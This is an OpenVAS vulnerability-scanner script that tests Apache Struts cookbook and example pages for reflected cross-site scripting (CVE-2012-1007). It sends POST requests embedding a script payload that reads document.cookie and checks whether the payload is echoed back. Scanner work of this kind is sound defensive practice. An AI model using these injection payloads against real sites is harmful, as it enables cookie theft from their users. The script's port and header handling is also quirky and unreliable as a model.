##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_apache_struts_cookbook_n_exmp_mul_xss_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# Apache Struts CookBook/Examples Multiple Cross-Site Scripting Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation could allow an attacker to execute arbitrary HTML
  code in a user's browser session in the context of a vulnerable application.
  Impact Level: Application.";
tag_affected = "Apache Struts (cookbook, examples) version 1.3.10 and prior.";

tag_insight = "Multiple flaws due to an,
  - Input passed via the 'message' parameter in 'processSimple.do' and
    'processDyna.do' action is not properly verified before it is returned
    to the user.
  - Input passed via the 'name' and 'queryParam' parameter in
    '/struts-examples/upload/upload-submit.do' action is not properly verified
    before it is returned to the user.";
tag_solution = "No solution or patch is available as of 08th, February 2012. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://struts.apache.org/download.cgi";
tag_summary = "This host is running Apache Struts and is prone to multiple
  Cross-site scripting vulnerabilities.";

if(description)
{
  script_id(802423);
  script_version("$Revision: 12 $");
  script_bugtraq_id(51900);
  script_cve_id("CVE-2012-1007");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-02-08 17:33:28 +0530 (Wed, 08 Feb 2012)");
  script_name("Apache Struts CookBook/Examples Multiple Cross-Site Scripting Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "
  Affected Software/OS:
  " + tag_affected + "
  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secpod.org/blog/?p=450");
  script_xref(name : "URL" , value : "http://secpod.org/advisories/SecPod_Apache_Struts_Multiple_Parsistant_XSS_Vulns.txt");

  script_description(desc);
  script_summary("Check if Apache Struts is vulnerable to cross-site scripting vulnerabilities");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 8080);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


asport = 0;
asreq = NULL;
asres = NULL;
asRes = NULL;
## Get HTTP Port

asport = get_http_port(default:8080);
if(asport){
  asport = 8080;
}

## Check for the port status
if(!get_port_state(asport)){
  exit(0);
}

## check the possibly configured names
foreach dir (make_list("/", "/struts", "/struts-cookbook", "/struts-examples"))
{
  ## Make list index pages
  foreach indexpage (make_list("/", "/welcome.do"))
  {
    ## Send and Recieve the response
    asreq = http_get(item:string(dir, indexpage), port:asport);

    if(!isnull(asreq))
    {
      asres = http_keepalive_send_recv(port:asport, data:asreq);

      ## Confirm the application Struts Cookbook
      if(!isnull(asres) && ">Struts Cookbook<" >< asres)
      {
        ## Construct the POST Attack for Struts Cookbook
        postdata = "name=xyz&secret=xyz&color=red&message=%3Cscript%3Ealert" +
                   "%28document.cookie%29%3C%2Fscript%3E&hidden=Sssh%21+It%" +
                   "27s+a+secret.+Nobody+knows+I%27m+here.";

        ## Construct the POST request Struts Cookbook
        asReq = string("POST ", dir, "/processSimple.do HTTP/1.1\r\n",
                     "Host: ", get_host_name(), "\r\n",
                     "User-Agent:  XSS-TEST\r\n",
                     "Content-Type: application/x-www-form-urlencoded\r\n",
                     "Content-Length: ", strlen(postdata), "\r\n",
                     "\r\n", postdata);
        asRes = http_send_recv(port:asport, data:asReq);

        ##  Confirm the exploit
        if(!isnull(asRes) && "<script>alert(document.cookie)</script>" >< asRes &&
           ">Simple ActionForm Example<" >< asRes)
        {
          security_warning(asport);
          exit(0);
        }
      }

      ## Confirm the application Struts Examples
      if(!isnull(asres) && ">Struts Examples<" >< asres)
      {
        ## Construct the POST data
        postdata = '-----------------------------7559840272055538773136052934'  +
                  '\r\nContent-Disposition: form-data; name="theText"\r\n\r\n' +
                  '\r\n-----------------------------7559840272055538773136052' +
                  '934\r\nContent-Disposition: form-data; name="theFile"; fil' +
                  'ename=""\r\nContent-Type: application/octet-stream\r\n\r\n' +
                  '\r\n-----------------------------7559840272055538773136052' +
                  '934\r\nContent-Disposition: form-data; name="filePath"\r\n' +
                  '\r\n<script>alert(document.cookie)</script>\r\n-----------' +
                  '------------------7559840272055538773136052934--\r\n';

        ## Construct the POST request
        asReq = string("POST ", dir, "/upload/upload-submit.do?queryParam=Successful HTTP/1.1\r\n",
                       "Host: ", get_host_name(), "\r\n",
                       "User-Agent:  XSS-TEST\r\n",
                       "Content-Type: multipart/form-data; boundary=---" +
                       "------------------------7559840272055538773136052934\r\n",
                       "Content-Type: application/x-www-form-urlencoded\r\n",
                       "Content-Length: ", strlen(postdata), "\r\n",
                       "\r\n", postdata);
        asRes = http_send_recv(port:asport, data:asReq);

        ## Confirm the exploit
        if(!isnull(asRes) &&
           "<script>alert(document.cookie)</script>" >< asRes &&
           ">File Upload Example<" >< asRes)
        {
          security_warning(asport);
          exit(0);
        }
      }
    }
  }
}
